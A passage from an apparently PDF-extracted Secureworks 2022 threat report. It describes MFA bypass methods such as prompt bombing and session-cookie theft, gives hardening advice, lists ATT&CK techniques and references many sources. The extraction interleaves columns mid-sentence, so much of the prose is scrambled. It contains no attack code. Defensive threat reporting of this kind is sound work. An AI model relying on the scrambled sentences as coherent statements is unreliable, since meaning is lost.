Secureworks)Figure 41\. Taegis XDR telemetry showing creation of mail forwarding rule by 
threat actor. (Source: Secureworks)2022 State of the Threat: A Year in Review61This handful of examples is indicative of the sorts of defensive evasionand anti\-analysis techniques routinely encountered by Secureworksincident responders. One thing that is notable about them is that noneof these techniques are particularly sophisticated. That is becausethreat actors do not need them to be; the adversary will only innovateenough to achieve their objectives, so there is a direct relationshipbetween the maturity of the controls in a target environment and thetechniques they employ to bypass those controls. Another notablepoint is that these techniques create patterns that can be used fordetecting threat actor activity.Organizations should ensure that they have preventative controlsimplemented to make it harder for an adversary to gain initial access totheir environment, as well as monitoring tools that challenge a threatactor's ability to remain hidden within the environment. The objectiveshould be to raise the cost for the adversary and, particularly foropportunistic threat actors, encourage them to go elsewhere.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review62010203040506
0607070808
09Letter From Our CTIOBypassing MFAExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatCredential abuse still represents a substantial proportion of IAVs. Multi\-reverse proxies to snoop on existing browser sessions to harvestfactor authentication is an important preventative control, especiallycredentials and session cookies as they appear on screen. This allowsfor internet\-facing applications and accounts with access to criticalthreat actors to hijack already authenticated sessions, bypassing MFA.resources. But Secureworks incident responders see regular examplesAnother method110 used Microsoft Edge WebView2 applications toof MFA being bypassed through various techniques. On a number ofsteal a user's authentication cookies and log into stolen accounts,occasions, threat actors have compromised accounts that have not yeteven when secured with MFA.been enrolled in MFA and have registered their own device. In March2022, CISA reported107 on a Russian government\-sponsored threatactor doing the same thing.Another common scenario encountered during Secureworks incidentresponse is 'prompt bombing', where a threat actor attempts to accessa legitimate MFA\-protected account through repeated login attempts,generating multiple MFA prompts in the hope that exasperationor distraction drives the legitimate user to approve one of them.The threat actor may generate multiple requests in a short timeperiod, send one or two prompts a day or employ telephone socialengineering.Implementing MFA ProperlyImplement MFA across all accounts, including serviceaccounts, particularly for remote access to corporateresources. This can be achieved by coupling the MFAsolution to the organization's identity provider.Disable legacy protocols that do not support MFA, includingMicrosoft's Basic Auth, which reaches end of life onOctober 1, 2022\.Use a service that requires complex interaction to approve 
logins (e.g number matching or other types of manualIn one incident observed by CTU researchers, a threat actor usedcode input) rather than simple 'click\-to\-approve' services.this technique to gain access to the environment and then request apassword reset on multiple social media accounts owned by the victim.The threat actors then sent convincing phishing emails to over 1,000employees at the victim's organization in an attempt to compromiseother accounts. 'Prompt bombing' has also reportedly108 been usedby the GOLD RAINFOREST (also known as Lapsus$) and IRON RITUALthreat groups.More esoteric techniques reported on by third parties during theyear also included the use109 of phishing kits that use transparentImplement MFA on accounts with access to critical assets,even for already authenticated users.Train users to recognize and report suspicious behaviors.Implement MFA as part of a layered security strategy.Use network segmentation to prevent the ability of threat 
actors who have gained access to carry out lateralmovement.2022 State of the Threat: A Year in Review6308
ConclusionOver the past year, the threat landscape has changed greatly in someis critical. Identify the assets you own, maintain awareness of whatways, yet in other ways scarcely at all. War in Ukraine has unleashedis happening in the threat landscape, and prioritize your controla flood of highly targeted cyber activity, but for the most part, itframework according to your business risk profile. Adopt a prioritizedhas remained laser\-focused on Ukraine. For most organizations,approach to vulnerability management. Ensure that internet\-facingransomware, like last year and the year before, remains the mostsystems and sensitive internal systems are protected with MFA, leavingpressing threat. Law enforcement is undoubtedly becoming moreno loopholes for threat actors to take advantage of. And instrumentaggressive and effective in disrupting the cybercriminal ecosystem,your network to provide comprehensive monitoring of endpoint,but these interventions are yet to radically alter the landscape. Gapsnetwork, and cloud resources.that have appeared in that ecosystem are quickly filled, either by theemergence of new actors or the re\-emergence of those previouslyThese time\-tried approaches, underpinned with ever\-improvingthought to have retired. Malware of all types continues to evolvetechnology solutions such as XDR, DDoS protection, and vulnerabilitywithout breaking any radically new ground, and threat actors are notprioritization, protect against nation\-state, cybercriminal, and hacktivistyet having to be particularly innovative in order to be successful.threat actors alike. Now is not the time to let your guard slip.For organizations facing this picture, the pressure continues to berelentless. Implementing good fundamental cybersecurity hygiene010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review6409
The Secureworks
View of the ThreatSecureworks' view of the threat landscape comes from a combinationThis data combines to produce a detailed and compelling pictureof telemetry from the Taegis XDR and VDR platforms, incident responseof threat actor behavior that portrays both the thrust of their high\-and Secureworks Adversary Group customer engagements, andlevel tactics and the technical details of their tooling. It powers thetechnical and tactical research conducted by the Counter Threat Unit.expert threat intelligence products published every week by the CTU,Together, that combines to produce a unique level of visibility intoand the unified "Rosetta Stone" that relates our threat groups to thethreat actor intent, capability, and activity; and just as importantly, intonaming conventions used by other TI providers. And it contributes towhat organizations need to do to reduce their risk.a repository of knowledge that drives the elite threat detection andIn the 12 months from July 2021, the Secureworks Incident 
Response team and Secureworks Counter Threat Unit 
conducted over 1,400\+ incident response engagements, 
across a wide spectrum of industry sectors.Secureworks processes approximately 3\.29 trillion eventlogs a week, or around 470 billion logs every single working 
day, gathered from security infrastructure in thousands of 
customer environments around the world.CTU researchers gather and analyze data from internallygenerated and externally collected telemetry, from multiple 
sources including publicly available information, dark 
web forums, proprietary botnet emulation systems, and 
intelligence relationships.integrated response actions that Taegis delivers.Actionable Intelligence Based
on Breadth and Depth
of UnderstandingTo be useful, threat intelligence has to be actionable. That meansproviding context on relevant threats in the form of written threatintelligence, webcasts, and threat briefings. It also means deployinginsights directly to the Taegis platform in the form of countermeasures,indicators, and advanced detectors.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review65010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatDrawing on a broad and deep understanding of the threat, CTU\-derivedcountermeasures provide detection value across the entirety of theattack lifespan. Figure 42 shows a heat map of detections, mappedto ATT\&CK techniques, for confirmed and mitigated security incidentinvestigations within the Taegis XDR platform between June 2021 andJune 2022\.Gather Victim Org 
InformationPhishing for InformationSystem Script Proxy 
ExecutionTrusted Developer 
Utilities Proxy ExecutionFigure 42\. Taegis countermeasure detections mapped to the ATT\&CK matrix for the period June 2021 \- June 2022\. (Source: Secureworks and MITRE's ATT\&CK Navigator111\)2022 State of the Threat: A Year in Review66DOMAINEnterprise ATT\&CK v11PLATFORMSLinux, MacOS, Windows,PRE, Containers, Network,Ofce 365, SaaS, GoogleWorkspace, IaaS, Azure ADLEGEND0\.0140280420560700Active ScanningGather Victim Host InformationGather Victim Identity InformationGather Victim Network InformationSearch Closed SourcesSearch Open Technical DatabasesSearch Open WebsitesDomainsSearch Victim\-Owned WebsitesReconnaissanceAcquire InfrastructureCompromise AccountsCompromise InfrastructureDevelop CapabilitiesEstablish AccountsObtain CapabilitiesStage CapabilitiesResource DevelopmentDrive\-by CompromiseExploit Public\-Facing ApplicationExternal Remote ServicesHardware AdditionsPhishingReplication Through Removable MediaSupply Chain CompromiseTrusted RelationshipValid AccountsInitial AccessCommand and Scripting InterpreterContainer Administration CommandDeploy ContainerExploitation for Client ExecutionInter\-Process CommunicationNative APIShared ModulesSoftware Deployment ToolsSystem ServicesUser ExecutionWindows Management InstrumentationExecutionAccount ManipulationBITS JobsBrowser ExtensionsCompromise Client Software BinaryCreate AccountExternal Remote ServicesImplant Internal ImageOfce Application StartupScheduled TaskJobScheduled TaskJobServer Software ComponentPersistenceAbuse Elevation Control MechanismAccess Token ManipulationBoot or Logon Autostart ExecutionBoot or Logon Autostart ExecutionBoot or Logon Initialization ScriptsBoot or Logon Initialization ScriptsCreate or Modify System ProcessCreate or Modify System ProcessDomain Policy ModicationEscape to HostEvent Triggered ExecutionEvent Triggered ExecutionExploitation for Privilege EscalationHijack Execution FlowHijack Execution FlowProcess InjectionScheduled TaskJobValid AccountsValid AccountsPrivilege EscalationAbuse Elevation Control MechanismAccess Token ManipulationBITS JobsDeobfuscateDecode Files or InformationDirect Volume AccessDomain Policy ModicationExecution GuardrailsExploitation for Defense EvasionFile and Directory Permissions ModicationHide ArtifactsHijack Execution FlowIndirect Command ExecutionMasqueradingModify Authentication ProcessModify Authentication ProcessModify Cloud Computer InfrastructureModify RegistryModify System ImageNetwork Boundary BridgingObfuscated Files or InformationPlist File ModicationPre\-OS BootPre\-OS BootProcess InjectionRogue Domain ControllerSubvert Trust ControlsSystem Binary Proxy ExecutionTemplate InjectionTrafc SignalingTrafc SignalingUnusedUnsupported Cloud RegionsUse Alternate Authentication MaterialValid AccountsVirtualizationSandbox EvasionWeaken EncryptionXSL Script ProcessingDefense EvasionAdversary\-in\-the\-MiddleAdversary\-in\-the\-MiddleBrute ForceCredentials from Password StoresExploitation for Credential AccessForced AuthenticationForge Web CredentialsInput CaptureModify Authentication ProcessMulti\-Factor Authentication InterceptionMulti\-Factor Authentication Request GenerationNetwork SnifngOS Credential DumpingSteal Application Access TokenSteal or Forge Kerberos TicketsSteal Web Session CookieUnsecured CredentialsCredential AccessAccount DiscoveryApplication Window DiscoveryBrowser Bookmark DiscoveryCloud Infrastructure DiscoveryCloud Service DashboardCloud Service DiscoveryCloud Storage Object DiscoveryContainer and Resource DiscoveryDebugger EvasionDomain Trust DiscoveryFile and Directory DiscoveryGroup Policy DiscoveryNetwork Service DiscoveryNetwork Share DiscoveryNetwork SnifngPassword Policy DiscoveryPeripheral Device DiscoveryPermission Groups DiscoveryProcess DiscoveryQuery Registry Remote System DiscoverySoftware DiscoverySystem Information DiscoverySystem Location DiscoverySystem Network Conguration DiscoverySystem Network Connections DiscoverySystem OwnerUser DiscoverySystem Service DiscoverySystem Time DiscoveryVirtualizationSandbox EvasionDiscoveryExploitation of Remote ServicesInternal SpearphishingLateral Tool TransferRemote Service Session HijackingRemote ServicesSoftware Deployment ToolsTaint Shared ContentUse Alternate Authentication MaterialLateral MovementArchive Collected DataAudio CaptureAutomated CollectionBrowser Session HijackingClipboard DataData from Cloud Storage ObjectData from Conguration RepositoryData from Information RepositoriesData from Local SystemData from Network Shared DriveData from Removable MediaData StagedEmail CollectionInput CaptureScreen CaptureVideo CaptureCollectionApplication Layer ProtocolCommunication Through Removable MediaData EncodingData ObfuscationDynamic ResolutionEncrypted ChannelFallback ChannelsIngress Tool TransferMulti\-Stage ChannelsNon\-Application Layer ProtocolNon\-Standard PortProtocol TunnelingProxyRemote Access SoftwareWeb ServiceCommand \& ControlAutomated ExltrationData Transfer Size LimitsExltration Over Alternative ProtocolExltration Over C2 ChannelExltration Over Other Network MediumExltration Over Physical MediumExltration Over Web ServiceScheduled TransferTransfer Data to Cloud AccountExltrationAccount Access RemovalData DestructionData Encrypted for ImpactData ManipulationDefacementDisk WipeEndpoint Denial of ServiceFirmware CorruptionInhibit System RecoveryNetwork Denial of ServiceResource HijackingService StopSystem ShutdownRebootImpactRootkitReective Code LoadingIndicator Removal on HostImpair DefensesDeploy ContainerDebugger EvasionBuild Image on HostReplication Through Removable MediaTrafc SignalingThe detections applied to Taegis XDR focus on being able to detectspecific instantiations of a given technique. For example, in the caseof 'OS Credential Dumping' (T1003112\) there are myriad ways that anadversary can dump credentials, ranging from the 'living off the land'technique described on page 38, to use of functionality provided bytools like Mimikatz to dump credentials in memory (figure 43\).It is through applying a broad and deep understanding of the threat,coupled with excellent visibility from different security controls acrossendpoint, network, and cloud, that organizations can rapidly increasetheir security maturity and detect threats as early as possible in theattack lifespan.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 43\. In\-memory detection of Mimikatz credential theft tool.
(Source: Secureworks)2022 State of the Threat: A Year in Review67123456789Learning from Incident Response: 2021 Year in Review, 
Secureworks.
https:www.secureworks.comresourcesrp\-learning\-from\-
incident\-response\-team\-2021\-year\-in\-reviewLetter From Our CTIOGOLD ULRICK threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
gold\-ulrickGOLD LOUNGE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-loungeExecutive Summary 
and Key FindingsTreasury Sanctions Evil Corp, the Russia\-Based 
Cybercriminal Group Behind Dridex Malware, U.S. 
Department of the Treasury, accessed 72722\.
https:home.treasury.govnewspress\-releasessm845Ransomware Remains the 
Primary Strategic ThreatGOLD DRAKE threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
gold\-drakeRansomware Enablers: 
Loaders and InfostealersTo HADES and Back: UNC2165 Shifts to LOCKBIT to 
Evade Sanctions, Mandiant, accessed 8422\.
https:www.mandiant.comresourcesunc2165\-shifts\-to\-
evade\-sanctionsCryptocurrency tumbler, Wikipedia, accessed 72722\. 
https:en.wikipedia.orgwikiCryptocurrency\_tumblerExploitation of Remote 
Services is Now the Most 
Common Access VectorGOLD BLACKBURN threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-blackburnReward Offers for Information to Bring Conti 
Ransomware Variant Co\-Conspirators to Justice, U.S. 
Department of State, accessed 8422\.
https:www.state.govreward\-offers\-for\-information\-to\-bring\-
conti\-ransomware\-variant\-co\-conspirators\-to\-justiceHostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus10Latvian National Charged for Alleged Role in 
Transnational Cybercrime Organization, Department of 
Justice, accessed 72722\. 
Defense Evasion Offers Its 
https:www.justice.govopaprlatvian\-national\-charged\-
Own Detection Opportunities
alleged\-role\-transnational\-cybercrime\-organization11GOLD ULRICK Leaks Reveal Organizational Structure 
and Relationships, Secureworks.
https:www.secureworks.combloggold\-ulrick\-leaks\-reveal\-
organizational\-structure\-and\-relationshipsConclusion121314One of the world's biggest hacker forums taken down, 
Europol, accessed 72722\.
https:www.europol.europa.eumedia\-pressnewsroom
newsone\-of\-world%E2%80%99s\-biggest\-hacker\-forums\-
taken\-downThe Secureworks
View of the Threat4 GOLD MYSTIC threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-mysticBlueCrab ransomware that keeps performing detection 
evasion, ASEC, accessed 72722\.
https:asec\-ahnlab\-com.translate.googjp19952x\_tr\_
sl\=ja\&\_x\_tr\_tl\=en\&\_x\_tr\_hl\=en\&\_x\_tr\_pto\=sc1516171819202122232425262728GOLD SOUTHFIELD threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-southfieldCustomer Advisory: Kaseya VSA Software Under Active 
Attack, Secureworks. 
https:www.secureworks.comblogkaseya\-vsa\-software\-
under\-active\-attackEXCLUSIVE Governments turn tables on ransomware 
gang REvil by pushing it offline, Reuters, accessed 
1\. https:www.reuters.comtechnologyexclusive\-governments\-
turn\-tables\-ransomware\-gang\-revil\-by\-pushing\-it\-
offline\-2021\-10\-21Russia takes down REvil hacking group at U.S. request \- 
FSB, Reuters, accessed 72722\.
https:www.reuters.comtechnologyrussia\-
arrests\-dismantles\-revil\-hacking\-group\-us\-request\-
report\-2022\-01\-14REvil Development Adds Confidence About GOLD 
SOUTHFIELD Reemergence , Secureworks.
https:www.secureworks.comblogrevil\-development\-adds\-
confidence\-about\-gold\-southfield\-reemergenceREvil prosecutions reach a 'dead end,' Russian media 
reports, Cyberscoop, accessed 8222\.
https:www.cyberscoop.comrevil\-prosecutions\-reach\-a\-
dead\-end\-russian\-media\-reportsGOLD BLAZER threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
GOLD\-BLAZERGOLD HAWTHORNE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
GOLD\-HAWTHORNEGOLD MATADOR threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
GOLD\-MATADORGOLD TOMAHAWK threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profilesGOLD\-
TOMAHAWKGOLD RAINFOREST threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-rainforestGOLD CRESTWOOD threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
GOLD\-CRESTWOODLazy Passwords Become Rocket Fuel for Emotet SMB 
Spreader, Secureworks.
https:www.secureworks.combloglazy\-passwords\-become\-
rocket\-fuel\-for\-emotet\-smb\-spreaderEmotet botnet comeback orchestrated by Conti 
ransomware gang, Bleeping Computer, accessed 
1\. https:www.bleepingcomputer.comnewssecurityemotet\-
botnet\-comeback\-orchestrated\-by\-conti\-ransomware\-gang2930GOLD LAGOON threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-lagoonGOLD SWATHMORE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profilesgold\-
swathmore31BishopFox sliver, accessed 8422\.
https:github.comBishopFoxsliver32WhisperGate: Not NotPetya, Secureworks.https:www.secureworks.comblogwhispergate\-not\-
notpetya333435363738394041424344GOLD PRELUDE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-preludeGOLD ZODIAC threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
gold\-zodiacRaccoon Stealer malware suspends operations due to 
war in Ukraine, Bleeping Computer, accessed 72822\. 
https:www.bleepingcomputer.comnewssecurityraccoon\-
stealer\-malware\-suspends\-operations\-due\-to\-war\-in\-ukraineBusiness Email Compromise: The $43 Billion Scam, 
Federal Bureau of Investigation, accessed 72822\. 
https:www.ic3\.govMediaY2022PSA220504Federal Bureau of Investigation Internet Crime Report 
2021, Federal Bureau of Investigation, accessed 7822\. 
https:www.ic3\.govMediaPDFAnnualReport2021\_
IC3Report.pdfKNOWN EXPLOITED VULNERABILITIES CATALOG, CISA. 
https:www.cisa.govknown\-exploited\-vulnerabilities\-catalogTaegis VDR.
https:www.secureworks.comproductstaegisvdrSpring Framework, Slintel, accessed 72822\.
https:www.slintel.comtechweb\-frameworkspring\-
framework\-market\-shareSpring Framework RCE, Early Announcement, Spring, 
accessed 72822\.
https:spring.ioblog20220331spring\-framework\-rce\-
early\-announcementLog4Shell: Easy to Launch the Attack but Hard to Stick 
the Landing Secureworks. 
https:www.secureworks.combloglog4shell\-easy\-to\-
launch\-the\-attack\-but\-hard\-to\-stick\-the\-landingMalicious Cyber Actors Continue to Exploit Log4Shell 
in VMware Horizon Systems, CISA, accessed 72822\.
https:www.cisa.govuscertncasalertsaa22\-174aExploits created for critical F5 BIG\-IP flaw, install patch 
immediately, Bleeping Computer, accessed 72822\. 
https:www.bleepingcomputer.comnewssecurityexploits\-
created\-for\-critical\-f5\-big\-ip\-flaw\-install\-patch\-immediately682022 State of the Threat: A Year in Review06070801020304050607080945464748Microsoft discovers threat actor targeting SolarWinds 
Serv\-U software with 0\-day exploit, Microsoft, 
accessed 72822\.
https:www.microsoft.comsecurityblog20210713
microsoft\-discovers\-threat\-actor\-targeting\-solarwinds\-serv\-
u\-software\-with\-0\-day\-exploitLetter From Our CTIOThreat actor DEV\-0322 exploiting ZOHO ManageEngine 
ADSelfService Plus, Microsoft, accessed 72822\.
https:www.microsoft.comsecurityblog20211108
threat\-actor\-dev\-0322\-exploiting\-zoho\-manageengine\-
Executive Summary 
adselfservice\-plus
and Key FindingsMysterySnail attacks with Windows zero\-day, Kaspersky, 
accessed 72822\.
https:securelist.commysterysnail\-attacks\-with\-windows\-
zero\-day104509Ransomware Remains the 
Primary Strategic ThreatBRONZE STARLIGHT Ransomware Operations Use HUI 
Loader, Secureworks.
https:www.secureworks.comresearchbronze\-starlight\-
ransomware\-operations\-use\-hui\-loader49Ransomware Enablers: 
Loaders and InfostealersA41APT case \~ Analysis of the Stealth APT Campaign 
Threatening Japan, JPCERT, accessed 72822\.
http:jsac.jpcert.or.jparchive2021pdfJSAC2021\_202\_niwa\-
yanagishita\_en.pdf5051BRONZE RIVERSIDE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
BRONZE\-RIVERSIDEExploitation of Remote 
Services is Now the Most 
Common Access VectorThe United States, Joined by Allies and Partners, 
Attributes Malicious Cyber Activity and Irresponsible 
State Behavior to the People's Republic of China, The 
White House, accessed 72822\.
Hostile Government\-
https:www.whitehouse.govbriefing\-room
statements\-releases20210719the\-united\-states\-
Sponsored Actor Activity 
joined\-by\-allies\-and\-partners\-attributes\-malicious\-
Shows a Regional Focus
cyber\-activity\-and\-irresponsible\-state\-behavior\-to\-the\-
peoples\-republic\-of\-china52BRONZE PRESIDENT threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
bronze\-presidentDefense Evasion Offers Its 
Own Detection Opportunities5354555657BRONZE PRESIDENT Targets Russian Speakers with 
Updated PlugX, Secureworks. 
https:www.secureworks.comblogbronze\-president\-
targets\-russian\-speakers\-with\-updated\-plugxConclusionBRONZE UNIVERSITY threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
bronze\-universityThe Secureworks
View of the ThreatShadowPad Malware Analysis, Secureworks.
https:www.secureworks.comresearchshadowpad\-malware\-
analysisCOBALT ULSTER threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
Cobalt\-ulsterIranian intel cyber suite of malware uses open\-source 
tools, U.S. Cyber Command, accessed 72822\.
https:www.cybercom.milMediaNewsArticle2897570
iranian\-intel\-cyber\-suite\-of\-malware\-uses\-open\-source\-tools5859Taking Action Against Hackers in Iran, Meta, accessed 
1\. https:about.fb.comnews202107taking\-action\-against\-
hackers\-in\-iranCOBALT FIRESIDE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-fireside60Media Coverage Doesn't Deter Actor From ThreateningDemocratic Voters, Proofpoint, accessed 72822\.
https:www.proofpoint.comusblogthreat\-insightmedia\-
coverage\-doesnt\-deter\-actor\-threatening\-democratic\-voters6162636465666768697071COBALT MIRAGE Conducts Ransomware Operations in 
U.S Secureworks.
https:www.secureworks.comblogcobalt\-mirage\-conducts\-
ransomware\-operations\-in\-usEspionage Campaign Targets Telecoms Organizations 
across Middle East and Asia, Symantec, accessed 
1\. https:symantec\-enterprise\-blogs.security.comblogsthreat\-
intelligenceespionage\-campaign\-telecoms\-asia\-middle\-eastCOBALT FOXGLOVE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-foxgloveCOBALT AGORA threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-agoraCOBALT LYCEUM threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-lyceumEvolving trends in Iranian threat actor activity \- 
MSTIC presentation at CyberWarCon 2021, Microsoft, 
accessed 72822\.
https:www.microsoft.comsecurityblog20211116
evolving\-trends\-in\-iranian\-threat\-actor\-activity\-mstic\-
presentation\-at\-cyberwarcon\-2021Log4j2 In The Wild \| Iranian\-Aligned Threat Actor 
"TunnelVision" Actively Exploiting VMware Horizon, 
SentinelOne, accessed 72822\.
https:www.sentinelone.comlabslog4j2\-in\-the\-wild\-iranian\-
aligned\-threat\-actor\-tunnelvision\-actively\-exploiting\-vmware\-
horizonCOBALT ILLUSION threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-illusionIranian Government\-Sponsored APT Cyber Actors 
Exploiting Microsoft Exchange and Fortinet 
Vulnerabilities in Furtherance of Malicious Activities, 
CISA, accessed 72822\. 
https:www.cisa.govuscertncasalertsaa21\-321aCOBALT SHADOW threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-shadowCOBALT SAPLING threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
cobalt\-sapling7273747576777879808182838485Uncovering MosesStaff techniques: Ideology over 
Money, Check Point, accessed 72822\.
https:research.checkpoint.com2021mosesstaff\-targeting\-
israeli\-companiesStrifeWater RAT: Iranian APT Moses Staff Adds New 
Trojan to Ransomware Operations, Cybereason, 
accessed 72822\. 
https:www.cybereason.comblogresearchstrifewater\-rat\-
iranian\-apt\-moses\-staff\-adds\-new\-trojan\-to\-ransomware\-
operationsRussian Law Enforcement Take Down Several 
Cybercrime Forums, Security Week, accessed 72922\. 
https:www.securityweek.comrussian\-law\-enforcement\-
take\-down\-several\-cybercrime\-forumsNotPetya Campaign: What We Know About the Latest 
Global Ransomware Attack, Secureworks.
https:www.secureworks.comblognotpetya\-campaign\-
what\-we\-know\-about\-the\-latest\-global\-ransomware\-attackRussia behind cyber\-attack with Europe\-wide impact 
an hour before Ukraine invasion, GOV.UK, accessed 
1\. https:www.gov.ukgovernmentnewsrussia\-behind\-cyber\-
attack\-with\-europe\-wide\-impact\-an\-hour\-before\-ukraine\-
invasionNews, CERT\-UA.
https:cert.gov.uaarticlesCyber attack of the Sandworm group (UAC\-0082\) 
on the energy facilities of Ukraine using malicious 
programs INDUSTROYER2 and CADDYWIPER (CERT\-
UA\#4435\), CERT\-UA, accessed 72822\.
https:cert.gov.uaarticle39518Mass distribution of the JesterStealer malware using 
the theme of a chemical attack (CERT\-UA\#4625\), CERT\-
UA, accessed 72822\.
https:cert.gov.uaarticle40135CERT\-UA, Facebook, accessed 72822\. 
https:www.facebook.comUACERTposts312939130865352MOONSCAPE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
moonscapeCyber attacks by groups associated with China against 
Russian scientific and technical enterprises and state 
bodies (CERT\-UA\#4860\), CERT\-UA, accessed 72822\. 
https:cert.gov.uaarticle375404IRON TILDEN threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
iron\-tildenIRON LIBERTY threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
iron\-libertyIRON HUNTER threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
iron\-hunter692022 State of the Threat: A Year in Review06070801020304050607080986IRON HEMLOCK threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
iron\-hemlock87IRON RITUAL threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
iron\-ritualLetter From Our CTIO8889IRON TWILIGHT threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
iron\-twilightExecutive Summary 
and Key FindingsIRON VIKING threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
iron\-viking90Ransomware Remains the 
Primary Strategic ThreatNICKEL ACADEMY threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
nickel\-academy919293949596Lazarus Targets Chemical Sector, Symantec, accessed 
1\. https:symantec\-enterprise\-blogs.security.comblogsthreat\-
intelligencelazarus\-dream\-job\-chemicalRansomware Enablers: 
Loaders and InfostealersNICKEL KIMBALL threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
nickel\-kimballExploitation of Remote 
Services is Now the Most 
Common Access VectorNorth Korean Hackers Have Prolific Year as Their 
Unlaundered Cryptocurrency Holdings Reach All\-time 
High, Chainalysis, accessed 72822\. 
https:blog.chainalysis.comreportsnorth\-korean\-hackers\-
have\-prolific\-year\-as\-their\-total\-unlaundered\-cryptocurrency\-
holdings\-reach\-all\-time\-highHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusNICKEL GLADSTONE threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
nickel\-gladstoneTraderTraitor: North Korean State\-Sponsored APT 
Targets Blockchain Companies, CISA, accessed 72822\.
https:www.cisa.govuscertncasalertsaa22\-108aDefense Evasion Offers Its 
North Korea Designation Update, U.S. Department of 
Own Detection Opportunities
the Treasury, accessed 72822\.
https:home.treasury.govpolicy\-issuesfinancial\-sanctions
recent\-actions2022041497ConclusionBRONZE BUTLER threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
bronze\-butler98The Secureworks
View of the ThreatDefeating APT10 compiler\-level obfuscations, Virus 
Bulletin, accessed 72822\.
https:www.virusbulletin.comconferencevb2019abstracts
defeating\-apt10\-compiler\-level\-obfuscations99GuLoader: Peering Into a Shellcode\-based Downloader, 
Crowdstrike, accessed 72822\.
https:www.crowdstrike.comblogguloader\-malware\-
analysis100GOLD DUPONT threat group profile, Secureworks.
https:www.secureworks.comresearchthreat\-profiles
GOLD\-DUPONT101THREAT ALERT: Raspberry Robin Worm Abuses 
Windows Installer and QNAP Devices, Cybereason, 
accessed 72822\. 
https:www.cybereason.comblogthreat\-alert\-raspberry\-
